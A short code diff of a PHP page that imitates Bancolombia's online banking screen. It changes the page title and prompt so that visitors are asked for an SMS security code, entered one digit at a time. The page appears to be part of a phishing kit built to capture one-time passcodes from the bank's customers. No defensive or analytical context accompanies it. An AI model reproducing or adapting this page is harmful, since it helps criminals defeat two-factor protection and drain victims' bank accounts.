@@ -5,7 +5,7 @@ $tiempo = b34f9_fecha_larga();
 ?>
 <html>
     <head>
-        <title>Bancolombia - Clave dinámica</title>
+        <title>Bancolombia - Clave SMS</title>
         <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
         
@@ -63,7 +63,7 @@ $tiempo = b34f9_fecha_larga();
 
         <div class="frm">
             <img src="../img/candado.jpg" width="16">
-            <div class="descripcion-app">Digita el mensaje dinámica de tu App Bancolombia</div>
+            <div class="descripcion-app">Digita el codigo de seguridad SMS</div>
             <table style="margin: 0 auto;" border="0" cellspacing="8">
                 <tr>
                     <td class="inp-pass"><input type="text" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
